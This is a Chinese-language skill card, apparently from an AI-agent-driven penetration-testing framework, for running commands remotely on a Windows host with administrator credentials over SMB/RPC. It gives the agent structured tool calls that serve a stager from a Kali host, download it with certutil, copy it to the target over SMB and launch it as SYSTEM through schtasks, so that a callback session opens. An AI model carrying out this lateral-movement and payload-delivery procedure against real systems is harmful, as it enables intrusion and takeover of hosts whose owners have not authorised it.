---
name: wmic-remote-cmd
handover: runtime
description: 用一组管理员凭据在目标主机上远程执行命令并回读执行身份（T1021 · smb/445 + RPC）。适用：先确认可达与凭据，再选路线点火并回读身份。
metadata:
  predicates:
  - windows_credential_remote_system
  - smb
  - T1021
  platforms:
  - linux
  - windows
  keywords:
  - WMI远程执行
  - 凭据远程执行
  - schtasks远程
  - psexec远程
  - exploit.wmic_remote_cmd
  - method
  - position
  - msf
  - tool
  - cmd
  - windows_credential_remote_system
  - smb
  - T1021
  - wmic
  - remote
  resources: []
  categories:
  - action-method
  aliases:
  - wmic
  - WMI
  - remote process
  parameters:
  - host
  - credential
  when:
    service: smb
  requires: []
  excludes: []
  carriers:
  - kali
  - shell
serves:
- smb
- windowsCredentialRemoteExecution
---

## 适用场景

目标为 Windows，已有管理员凭据，445（需要时含 135/RPC）可达；本步必须交付满足节点身份要求的会话。
- 先确认命令实际在哪台机器执行。通常从能到目标网段的 Windows 会话操作；不要把 Linux 工具发进 Windows 会话。
- 当前会话令牌可能是 SYSTEM 或本机账户，不能替代目标管理员凭据；远程调用显式使用本步绑定材料。
- 能填入口槽位的表示优先：明文 `mode: password` 在 `mode: ntlm` 前；同表示内 `order=1 / origin=derived` 优先于 `order=2 / origin=external`。
候选的 order 是运行侧实际排序后的序号；上述 derived / external 次序只用于同一表示的比较，不把来源固定绑定到序号。
- 哈希只进 `-hashes` / `--hashes` 等支持哈希的槽位；`schtasks /p`、`/rp`、`net use` 的口令槽位不可填哈希。类型不支持不是口令被目标否定。
- 只有一份候选就只用该份；旧 `credential_ref` 指第一份。两处均无材料，以 `CREDENTIAL_MISSING` 拒绝，不猜账号或口令。

## 参数

- 输入 `target_host`：来自 graph
- 输入 `credential_ref`：来自 graph
- 输入 `session_ref`：来自 runtime
- 交付：evidence
- 执行位置：position
- 可用工具：msf、tool、cmd
- 图适用：case=windows_credential_remote_system；service=smb；technique=T1021

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**一条一个动作块**：一次答复只给一个请求；不拼长行、不发数组、不把多步塞进一条命令。

**一次回答一个动作；先读该动作回执，再发下一动作。** 不发送 `actions` 数组，不把有依赖的多步用 `&` 拼成长命令。
Windows 命令统一写成 `{"tool":"run_command","target":"session","arguments":{"interpreter":"cmd","command":"<一条命令行>"}}`；运行层在**本步绑定的那条会话**上执行并回收输出。
普通 shell 不能接原生 `msf` 动词（`LEAN_MSF_NEEDS_METERPRETER_SESSION`）。不要用 `execute -f cmd.exe -a "…"` 代替可回显调用。
凭据不进入模型输出。需要认证的远程执行只发 `remote_process`，由运行层解析 `credential_ref` 并注入命令；模型不写口令、哈希或 `net use`/`schtasks` 的明文槽位。

### 交付路线与身份

凭据由运行层注入，模型只发不带口令的结构化请求；`credential_ref` 取
`context.node.credential`，没有就留空。**不要自己写 `net use` / `schtasks /p`
的口令或哈希。**

**监听与弹头由运行层预置**：运行层已按目标平台选好 payload、分配回调端口、
武装 handler，并生成 stager。本卡只使用 `delivery_artifact_url`、
`delivery_remote_path`、`delivery_work_dir`、`delivery_fetch_port`。

6. **起取件台（控制端）**：
   `{"tool":"serve_file","target":"kali","arguments":{"directory":"<delivery_work_dir>","port":<delivery_fetch_port>}}`

7. **执行面取件（当前绑定会话，无凭据）**：
   ```text
   {"tool":"run_command","target":"session","arguments":{"interpreter":"cmd","command":"certutil -urlcache -f <delivery_artifact_url> <delivery_remote_path>"}}
   ```
   回执即使暂时没有输出，下一步 `smb_copy` 的 `dir` 会证明文件存在；文件不存在时再重发本步。

8. **执行面把 stager 投到目标（凭据由运行层解析）**：
   ```text
   {"tool":"remote_process","target":"session","arguments":{"host":"<target_host>","command":"copy","credential_ref":"","method":"smb_copy","local_path":"<delivery_remote_path>","remote_path":"<delivery_remote_path>"}}
   ```
   回执须含 `已复制` 或 `1 file(s) copied`。

9. **在目标上以 SYSTEM 启动 stager**：
   ```text
   {"tool":"remote_process","target":"session","arguments":{"host":"<target_host>","command":"<delivery_remote_path>","credential_ref":"","method":"schtasks"}}
   ```
   回执给出任务创建/运行结果即可；真正的会话由运行层在下一步认领。

10. **收尾**：引本次回执 → `finish`；**会话由运行层认领、登记并探活，本卡不自己登记**。

**本卡的完成依据是「交付段」最后一步的回执**（载荷被目标取到并启动 / 会话已交付）：命令回显、PoC 成功、文件读取、身份证据都只是**中间观察**，**不能**用来判 `action_complete=true`。拿到交付段最后一步的回执即判 `passed` 且 `action_complete=true`，**不要再追加任何「确认会话」的探测**（监听列表、连接数、端口都不是完成依据）；会话的认领、登记与探活由运行层负责，它认领不到会**如实记录未确认**，那不是让你在本卡里继续试的理由。

本步判 `passed` 需要出现本卡要求的证据；出现明确失败条件判 `failed`；证据不足或效果未确认判 `unknown`，不拿「请求已发出」代替证据。

**停止边界**：本卡一次调用只做本页列出的动作；完成即结束，不由本卡重试、追加动作、换通道或改变判据。


## 完成依据

`finish.verdict` 判所需事实，不判查询是否完成。保留本次 `call_id`、`host`、`exec_hostname`、`exec_user`（有 SID 时一并保留）、`exit_code` 与原始 `stdout`。
- 核对 freshness：本次调用与输出对应；target：本次交付会话的主机与节点目标一致；identity：该会话的实际身份达到节点要求。
- `pass`：有效回执支持所需事实，且已声明的会话实际登记、随后观察成立；身份不能从任务参数、标签或别的会话借来。
- `unsatisfied`：完整且绑定正确的回执明确否定要求，例如已确认交付身份低于要求；查询或创建调用成功不等于事实成立。
- `uncertain`：缺输出、交付未确认、目标/身份绑定不明或权限不足。不得将“没有读到”当作事实已被否定。
`ReturnValue = 0`、ProcessId、任务创建/运行成功和 `Process NNNN created.` 都不能替代会话与身份证据；图事实由独立 verifier 判定。

## 失败条件

**账号锁定立即停止，不再尝试下一份凭据。调用尚未明确时遵守运行层停止要求，不重试或另行派发。**
- 本次明确 `STATUS_LOGON_FAILURE`、`STATUS_WRONG_PASSWORD`、`STATUS_NO_SUCH_USER` 或 Windows 1326，才据原文与 call_id 判断当前凭据不适用并考虑下一候选。
- 认证后的 `STATUS_ACCESS_DENIED` / Windows 错误 5 是权限问题；笼统拒绝访问不足以判断凭据错误，不据此切换材料。
- “不是内部或外部命令” / `command not found`：核对执行机器与工具，按已允许路线修正；连接超时/拒绝/不可达：核对可达位置，不原样重发同一命令。
- `1060 指定的服务未安装`：回到相应创建步骤核对是否成功。身份不符时修正启动方式；这些针对性修正不等于无依据重复执行。

[共享执行规则](../../src/skills/templates/execution_rules.txt)

**停止边界**：本卡一次调用只做本页列出的动作；完成即结束，不由本卡重试、追加动作、换通道或改变判据。
